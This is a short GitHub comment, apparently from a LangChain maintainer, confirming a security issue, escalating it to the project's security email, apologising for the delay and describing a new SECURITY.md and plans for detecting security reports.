| Issue confirmed, escalating to `security@langchain.dev`.  Apologies for the delay here. This issue slipped through the cracks, which should not have happened. We're going to use this instance as an internal case study to make sure we do way better in the future.  We've already added a `SECURITY.md` to the repo so that GitHub directs users to send security-related information to `security@langchain.dev` to ensure any security-related issues are promptly acted upon: [#9551](https://github.com/langchain-ai/langchain/pull/9551)  We're also looking at automation to help us detect security-related issues opened on public GitHub, so we can more effectively internally escalate it to `security@langchain.dev` as well. |
